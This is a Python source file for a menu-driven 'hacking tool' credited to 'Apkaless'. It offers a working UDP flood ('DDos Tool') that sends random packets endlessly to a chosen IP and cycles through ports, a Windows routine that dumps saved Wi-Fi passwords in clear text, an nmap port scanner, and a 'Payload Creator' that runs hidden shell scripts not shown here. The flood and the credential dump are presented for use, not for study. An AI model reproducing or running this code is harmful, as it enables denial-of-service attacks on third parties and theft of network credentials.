try:
     import socket
     import sys
     import random
     import time
     import nmap
     import threading
     import proxyscrape
     import subprocess
     import os
     from pafy import new
     import colorama 
     from colorama import Fore, Back, Style
     import marshal
     import requests
     import platform
     import modulefinder
     import who_is_on_my_wifi
     import urllib.request
     import modulefinder
     import datetime
     from pydub import AudioSegment
     from pydub.playback import play
     from playsound import playsound
     from Proxy_List_Scrapper import Scrapper, Proxy, ScrapperException

     # code started

     def updateTool():
          os.system("clear")
          print("Getting Permission...")
          time.sleep(2)
          os.system("clear")
          print("Updating...")
          time.sleep(2)
          os.system("chmod +x updater.sh")
          os.system("./updater.sh")
          time.sleep(2)
          
     def slowprint(s):
          for c in s + '\n':
               sys.stdout.write(c)
               sys.stdout.flush()
               time.sleep(1./20)
     
     def fastprint(s):
          print(Fore.GREEN + Style.BRIGHT)
          for c in s + '\n':
               sys.stdout.write(c)
               sys.stdout.flush()
               time.sleep(1./90)

     # This is Code For Hostname Tool

     def gethostbyname1():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear") 
          os.system("figlet IP TOOL")
          print("")
          #  print("""Welcome To IP Tool\n
          #      Creator: Apkaless\n
          #      Country: Iraq\n""")
          hostname = input(str(Fore.GREEN + "Enter Any Host Name: "))
          ipaddress = socket.gethostbyname(hostname)
          time.sleep(1)
          print("")
          print(Fore.GREEN + "IP Address of the hostname {} is : {}" .format(hostname, Fore.BLUE + ipaddress))
          time.sleep(1)
          print("")
          print(Fore.GREEN + "This Tool Was Created By Apkaless ☣")
          time.sleep(1)
          print("")
          print(Fore.GREEN + "Thanks For Using My Tool ☣")
          time.sleep(1)
          print("")
          print(Fore.GREEN + """Select An Action:\n
                    1) DDos IP
                    2) Scan IP
                    3) Exit\n""")
          answer = input(Fore.GREEN + "Choose Option: ")
          if answer == "1":
               ddostool()
          elif answer == "2":
               scanner()
               
          else:
               starting()

     # This is The End Of The Code


     # This Code Of DDos Tool

     def ddostool():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet DDos Tool")
          # print("\nDDos Tool By Apkaless")
          time.sleep(1)
          print("")
          # # print("Country: Iraq")
          # time.sleep(1)
          # print("")
          #####################################################
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          bytes = random._urandom(2000)
          #####################################################
          host = input(Fore.GREEN + "Target IP: ")
          time.sleep(1)
          print("")
          print(Fore.GREEN + "The Default Port is 80")
          time.sleep(1)
          print("")
          port = int(input(Fore.GREEN + "Port: "))
          sent = 0
          os.system("clear")
          os.system("figlet DDos Starting.....")
          time.sleep(2)
          print(Fore.GREEN + "[=======] 0%")
          time.sleep(1)
          print(Fore.GREEN + "[===============] 25%")
          time.sleep(1)
          print(Fore.GREEN + "[======================] 50%")
          time.sleep(1)
          print(Fore.GREEN + "[==========================] 75%")
          time.sleep(1)
          print(Fore.GREEN + "[===============================] 100%")
          time.sleep(1)
          while True:
               try:
                    from datetime import datetime
                    now = datetime.now()
                    s.connect((host,port))
                    print("Connected\n")
                    s.sendto(bytes, (host,port))
                    sent = sent + 1
                    port = port + 1
                    print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless %s"%(sent,Style.NORMAL + host,port, now))
                    if port == 65535:
                         port = 1
               except (ConnectionRefusedError, ConnectionError):
                    print("\nConnection Was Lost\n")
                    input("Press Enter To Back...")
                    starting()
     #This is The End Of Code


     #This Code For Scanner tool

     def scanner():
          try:
               print(Style.BRIGHT)
               print(Fore.GREEN)
               # print("\nWelcome To Scanner Tool")
               # print("<------------------------------------->")
               # print("Creator: Apkaless")
               # print("")
               # print("Country: IRAQ")
               # print("")
               os.system("clear")
               os.system("figlet IP SCANNER")
               print("")
               nmScan = nmap.PortScanner()
               host = input(Fore.GREEN + "Enter The IP Address You Want To Scan: ")
               print("")
               time.sleep(1)
               print(Fore.GREEN + "Your IP Address is:",Fore.BLUE + host)
               print("")
               time.sleep(1)
               # print("Thanks For Using My Tool")
               # time.sleep(1)
               res = input(Fore.GREEN + """Please Select A Method:\n
                         1) SYN ACK Scan
                         2) UDP Scan\n
                         Option --> """)
               time.sleep(1)
               print("")
               print(Fore.GREEN + "You Selected Option: ",Fore.BLUE + res)
               print("")
               if res == "1": # SYN ACK SCAN 
                    print(Fore.GREEN + "Nmap Version",nmScan.nmap_version())
                    print("")
                    time.sleep(1)
                    print(Fore.GREEN + "Scanning.....")
                    print("")
                    nmScan.scan(host,'1-1024','-sV')
                    print(nmScan.scaninfo())
                    print("")
                    for host in nmScan.all_hosts():
                         print(Fore.GREEN + Style.NORMAL + "Host: %s" %(Fore.GREEN + Style.BRIGHT + host))
                         print("")
                         print(Fore.GREEN + Style.NORMAL + "State: %s" %(Fore.GREEN + Style.BRIGHT + nmScan[host].state()))
                         print("")
                    for proto in nmScan[host].all_protocols():
                         print(Fore.GREEN + Style.NORMAL + "Protocol: %s" %(Fore.GREEN + Style.BRIGHT + proto))
                         print("")
                         for key in nmScan[host]['tcp'].keys():
                              print(Fore.GREEN + "--------------------")
                              print(Fore.GREEN + "Port: %s %s %s \n" %(key,proto,nmScan[host].tcp(key)))
                    print("")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
               elif res == "2":
                    print("Nmap Version",nmScan.nmap_version())
                    print("Scanning.....")
                    nmScan.scan(host,'1-1024','-v -sU')
                    print(nmScan.scaninfo())
                    for host in nmScan.all_hosts():
                         print("Host: %s" %(Fore.BLUE + host))
                         print("State: %s" %(nmScan[host].state()))
                    for protocol in nmScan[host].all_protocols():
                         print("Protocol: %s" %(Fore.BLUE + protocol))
               else:
                    print(Fore.GREEN + "Please Select a Valid Option\n")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
          except ModuleNotFoundError:
               print("Please Open README.md File\n")
               print(Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", "File")

     # This The End Of The Code
          
     def scraper():
          os.system("clear")
          os.system("figlet Proxies")
          print("")
          scrapper = Scrapper(category='ALL', print_err_trace=False)
          data = scrapper.getProxies()
          print("Scrapped Proxies:\n")
          for item in data.proxies:
               print("{}:{}" .format(item.ip, item.port))
          print("\nTotal Proxies:", data.len)
          print("\nCategory of the Proxy:", data.category)
          print("")

     def wifiPassword():
          print(Style.BRIGHT)
          print(Fore.GREEN + "Wifi Password Tool 2020")
          print("")
          data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
          profiles = [i.split(':')[1][1:-1] for i in data if "All User Profile" in i] # Wifi Name
          for i in profiles:
               try:
                    result = subprocess.check_output(['netsh','wlan','show','profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b] # Wifi Password
                    try:
                         for password in result:
                                   print(Fore.GREEN + "Wifi Name: {}\n\nPassword: {}" .format(i,password))
                    except IndexError:
                         print(Fore.GREEN + "Wifi Name: {} Password: {}" .format(i,""))
               except subprocess.CalledProcessError:
                    print(Fore.GREEN + "Wifi Name: {} {}" .format(i,"ENCODING ERROR"))
          print("")
          input(Fore.GREEN + "Coded By Apkaless ")

     def whoIsOnMyWifi():
          os.system("clear")
          os.system("figlet Who Is On My Wifi")
          print("")

          who = who_is_on_my_wifi.who()

          for i in who:
               time.sleep(1)
               print(Fore.BLUE + Style.NORMAL + "====================================================================================================\n")
               print(Fore.GREEN + Style.NORMAL + i[0], Style.BRIGHT + i[1], "\n", Style.NORMAL + i[2], Style.BRIGHT + i[3], "\n", Style.NORMAL + i[4], Style.BRIGHT + i[5],"\n")
          print("Apkaless The Warrior\n")
          input("Press Enter To Back...")
          starting()

     def videoDownload():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet YouTube Video")
          url = input(Fore.GREEN + "Enter YouTube Video Link: ")
          print("")
          video = new(url)

          def forVideo():

               streams = video.streams
               title = video.title
               i = 0 
               for stream in streams:
                    print("\n",str(i),"-",stream,"\n")
                    i += 1
               streamNumber = int(input(Fore.GREEN + "Enter Number 0 OR 1 : "))
               print(Fore.GREEN + "\nYour Option : ",streamNumber,"\n")
               if platform.machine()=="x86_64":
                    streams[streamNumber].download()
                    print("Video Title : ", title)
                    print(Fore.GREEN + "\nYour Video Successfully Downloaded\n")
                    print(Fore.GREEN + "Your Video Path : /root/ApkalessTool/YourVideo")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
               else:
                    streams[streamNumber].download()
                    print("Video Title : ", title)
                    print(Fore.GREEN + "\nYour Video Successfully Downloaded\n")
                    print(Fore.GREEN + "Your Video Path : ApkalessTool/YourVideo")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()

          def forAudio():

               audios = video.audiostreams
               a = 0
               for audio in audios:
                    print(Fore.GREEN + str(a),"-",audio,"\n")
                    a += 1
               audioNumber = int(input(Fore.GREEN + "Enter Number: "))
               print("")
               if platform.machine()=="x86_64":
                    audios[audioNumber].download()
                    print(Fore.GREEN + "\nYour Audio File Successfully Downloaded\n")
                    print(Fore.GREEN + "Your Audio File Path: /root/ApkalessTool/YourVideo")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
               else:
                    audios[audioNumber].download()
                    print(Fore.GREEN + "\nYour Audio File Successfully Downloaded\n")
                    print(Fore.GREEN + "Your Audio File Path: ApkalessTool/YourVideo")
                    input(Fore.GREEN + "Press Enter To Back.....")
                    starting()

          streamType = input(Fore.GREEN + """Select Option:
                                        
                    1) Video 
                    2) Audio File

          Enter Number 1 OR 2 : """)

          if streamType == "1":
               forVideo()
          elif streamType == "2":
               forAudio()
          else:
               input(Fore.GREEN + "Press Enter To Back.....")
               starting()

     def payload_creator_windows():
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          os.system("chmod +x .windows_payload.sh")
          os.system("./.windows_payload.sh")
     def payload_creator_linux():
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          os.system("chmod +x .linux_payload.sh")
          os.system("./.linux_payload.sh")

     #=================== Starting Tools ===================#
    #|                                                      |#
    #|                                                      |#
    #|                  Hacking Tools                       |#
    #|                                                      |#
    #|                                                      |#
    #|======================================================|#

     def starting():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet Apkaless")
          time.sleep(1)
          print("")
          slowprint("Hello Citizen Of The World.\n")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Creator   : ", Style.BRIGHT + "APKALESS (SABAH)")
          print(Fore.BLACK + Style.BRIGHT + "[☣]", Fore.LIGHTBLACK_EX + Style.NORMAL + " Creator   : ", Style.BRIGHT + "ABDULLAH")
          print(Fore.RED   + Style.BRIGHT + "[☣]", Fore.RED + Style.NORMAL + " Creator   : ", Style.BRIGHT + "AMEER")
          print(Fore.RED   + Style.BRIGHT + "[☣]", Fore.RED + Style.NORMAL + " Creator   : ", Style.BRIGHT + "HUSSEIN")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Country   : ", Style.BRIGHT + "IRAQ")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " YouTube   : ", Style.BRIGHT + "https://www.youtube.com/c/apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Github    : ", Style.BRIGHT + "https://github.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Facebook  : ", Style.BRIGHT + "https://www.facebook.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Instagram : ", Style.BRIGHT + "https://www.instagram.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Server    : ", Style.BRIGHT + "Online")
          fastprint("""  =================================================
 	    Created By Apkaless The Warrior             
  =================================================
                ++++++++++++++++++++
             
            Apkaless              
        _,.                  
      ,` -.)         
     ( _/-\\-._ 
    /,|`--._,-^|            ,
    \_| |`-._/||          , |
      |  `-, / |         /  /
      |     || |        /  /
       `r-._||/   __   /  /
   __,-<_     )`-/  `./  /
   \   `---    \   / /  / 
      |           |./  /  
      /           //  /  
  \_/  \         |/  /
   |    |   _,^- /  /
   |    , ``  (\/  /_
    \,.->._    \X-=/^
    (  /   `-._//^`
     `Y-.____(__}
      |     {__)
           ()   V.1.0
""")
          try:
               # print("Verifying The Code....")
               # time.sleep(2)
               # print("")

               fastprint("""What Do You Want?\n
          [1] Get IP Tool

          [2] Scanner Tool

          [3] DDos Tool

          [4] Proxy Scrapper

          [5] Get Your Wifi Password (Windows Only)

          [6] YouTube Video Download

          [7] Who Is On My Wifi

          [8] System Informations

          [9] Payload Creator

          [10] Update Tool\n""")
                                        
               print("\nPress", Fore.BLUE + Style.NORMAL + "Ctrl", Fore.GREEN + Style.BRIGHT + "+", Fore.RED + Style.NORMAL + "C", Fore.GREEN + Style.BRIGHT + "To Exit From This Tool.\n")

               starthacking = input("""
               
     Choose Option -----> """)

               if starthacking == "1":
                    gethostbyname1()
               if starthacking == "2":
                    scanner()
               if starthacking == "3":
                    ddostool()
               if starthacking == "4":
                    scraper()
               if starthacking == "5":
                    wifiPassword()
               if starthacking == "6":
                    videoDownload()
               if starthacking == "7":
                    whoIsOnMyWifi()
               if starthacking == "8":
                    os.system("clear")
                    os.system("figlet Sys Info")
                    print("")
                    time.sleep(2)
                    uname = platform.uname()
                    system = platform.system()
                    node = platform.node()
                    release = platform.release()
                    version = platform.version()
                    machine = platform.machine()
                    processor = platform.processor()

                    print(Fore.GREEN + Style.NORMAL + "System:",          Fore.LIGHTBLACK_EX + Style.NORMAL + system,    "\n")
                    print(Fore.GREEN + Style.NORMAL + "Device Name:",     Fore.LIGHTBLACK_EX + Style.NORMAL + node,      "\n")
                    print(Fore.GREEN + Style.NORMAL + "Release:",         Fore.LIGHTBLACK_EX + Style.NORMAL + release,   "\n")
                    print(Fore.GREEN + Style.NORMAL + "Version:",         Fore.LIGHTBLACK_EX + Style.NORMAL + version,   "\n")
                    print(Fore.GREEN + Style.NORMAL + "Machine:",         Fore.LIGHTBLACK_EX + Style.NORMAL + machine,   "\n")
                    print(Fore.GREEN + Style.NORMAL + "Processor:",       Fore.LIGHTBLACK_EX + Style.NORMAL + processor, "\n")
                    input(Fore.GREEN + Style.BRIGHT + "Press Enter To Back...")
                    starting()
               if starthacking=="9":
                    os.system("clear")
                    os.system("figlet Apkaless")
                    print("")
                    slowprint("Select Platform ==> 1) Windows 2) Linux")
                    print("")
                    platform = input("==> ")
                    if platform == "1" or platform == "Windows" or platform =="windows":
                         payload_creator_windows()
                    if platform == "2" or platform == "Linux" or platform == "linux":
                         payload_creator_linux()

               if starthacking=="10":
                    updateTool() 




          except KeyboardInterrupt:
               print(Fore.GREEN + Style.BRIGHT + " \n\nHave A Nice Day ;)\n")
               exit()
     try:
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          print(Fore.GREEN + "Please Wait While",Fore.BLUE + "Apkaless", Fore.GREEN + "Setting Up His Own Tool\n")
          time.sleep(2)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          slowprint("Checking Internet Connection...")
          time.sleep(2)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          try:
               url = "https://google.com"
               timeout = 5
               request = requests.get(url, timeout=timeout)
               print("Connected")
               time.sleep(1)
          except (requests.ConnectionError, requests.Timeout) as exception:
               print("No Internet Connection Try Again Later.\n")
               input("Exit...")
               exit()
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          slowprint("Checking System...")
          time.sleep(2)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          slowprint("Checking Requirements...")
          time.sleep(2)
          # print(Fore.RED + "Note :", Fore.GREEN + "Please Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.GREEN + "If You Get Any", Fore.RED + "Error")
          starting()
     except KeyboardInterrupt:
          print(Style.BRIGHT)
          print(Fore.GREEN + " \n\nHave A Nice Day ;)\n")
     # os.system("clear")
     # os.system("figlet Apkaless")
     # print("")
     # print("Creator : APKALESS")
     # print("Country : IRAQ")
     # print("YouTube : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
     # print("Github  : https://github.com/Apkaless")
     # print("Facebook: https://www.facebook.com/Apkaless")
     # print("")
     # starting()


     # ActivationCode = input("Activation Code: ")
     # print("")

     # if ActivationCode == "APIQIRAQ110HACKER":
     #       starting()
     # else:
     #       print("Verifying The Code....")
     #       time.sleep(2)
     #       print("")
     #       print("The Code is Wrong")
     #       print("")
     #       input("Press Enter To Exit....")

     # #code ended
except ModuleNotFoundError:
     import os
     import sys
     import time
     import modulefinder
     import platform
     def moduleFinder_x86_64():
          module = modulefinder.ModuleFinder(path=['/usr/local/lib/python3.9/dist-packages/colorama/', '/usr/local/lib/python3.8/dist-packages/colorama/'])
          if module is FileNotFoundError:
               time.sleep(10)
               os.system("clear")
               time.sleep(2)
               os.system("pip install colorama")
          else:
               from colorama import Fore, Back, Style
               os.system("clear")
               print(Fore.RED)
               os.system("figlet Apkaless")
               print("")
               time.sleep(1)
               print(Fore.RED + Style.BRIGHT + "ERROR error\n")
               print(Fore.BLUE + "Installation : \n")
               print(Fore.CYAN + "1)", Fore.RED + "Install", Fore.BLUE + "figlet", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.YELLOW + "(For Linux : apt install figlet)", Fore.GREEN + "(For Termux : pkg install figlet)", Fore.BLACK + "(For Ish IOS : apk add figlet\n)")
               print(Fore.CYAN + "2)", Fore.RED + "Please Open", Fore.BLUE + "README.md", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "cat README.md\n")
               print(Fore.CYAN + "3)", Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "python3 -m pip install -r requirements.txt\n")
               print(Fore.CYAN + "4)", Fore.BLUE + Style.BRIGHT + "Try To Run The Tool Again\n")
               print(Fore.CYAN + "5)", Fore.BLUE + "Enjoy:)\n")
               time.sleep(2)
               exit()
     def moduleFinder_i686():
          modulePython3x8 = modulefinder.ModuleFinder(path='/usr/lib/python3.8/ste-packages/colorama/')
          modulePython3x9 = modulefinder.ModuleFinder(path='/usr/lib/python3.8/ste-packages/colorama/')
          if modulePython3x8 is FileNotFoundError:
               os.system("clear")
               time.sleep(2)
               os.system("pip install colorama")
          elif modulePython3x9 is FileNotFoundError:
               os.system("clear")
               time.sleep(2)
               os.system("pip install colorama")
          else:
               from colorama import Fore, Back, Style
               os.system("clear")
               print(Fore.RED)
               os.system("figlet Apkaless")
               print("")
               time.sleep(1)
               print(Fore.RED + Style.BRIGHT + "ERROR error\n")
               print(Fore.BLUE + "Installation : \n")
               print(Fore.CYAN + "1)", Fore.RED + "Install", Fore.BLUE + "figlet", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.YELLOW + "(For Linux : apt install figlet)", Fore.GREEN + "(For Termux : pkg install figlet)", Fore.BLACK + "(For Ish IOS : apk add figlet\n)")
               print(Fore.CYAN + "2)", Fore.RED + "Please Open", Fore.BLUE + "README.md", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "cat README.md\n")
               print(Fore.CYAN + "3)", Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "python3 -m pip install -r requirements.txt\n")
               print(Fore.CYAN + "4)", Fore.BLUE + Style.BRIGHT + "Try To Run The Tool Again\n")
               print(Fore.CYAN + "5)", Fore.BLUE + "Enjoy:)\n")
               time.sleep(2)
               exit()
     if platform.machine()=='x86_64':
          moduleFinder_x86_64()
     elif platform.machine()=='i686':
          moduleFinder_i686()
     else:
          os.system("clear")
          os.system("pip install colorama")
          time.sleep(2)
          from colorama import Fore, Back, Style
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          time.sleep(1)
          print(Fore.RED + Style.BRIGHT + "ERROR error\n")
          print(Fore.BLUE + "Installation : \n")
          print(Fore.CYAN + "1)", Fore.RED + "Install", Fore.BLUE + "figlet", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.YELLOW + "(For Linux : apt install figlet)", Fore.GREEN + "(For Termux : pkg install figlet)", Fore.BLACK + "(For Ish IOS : apk add figlet\n)")
          print(Fore.CYAN + "2)", Fore.RED + "Please Open", Fore.BLUE + "README.md", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "cat README.md\n")
          print(Fore.CYAN + "3)", Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "python3 -m pip install -r requirements.txt\n")
          print(Fore.CYAN + "4)", Fore.BLUE + Style.BRIGHT + "Try To Run The Tool Again\n")
          print(Fore.CYAN + "5)", Fore.BLUE + "Enjoy:)\n")
          time.sleep(2)
          exit()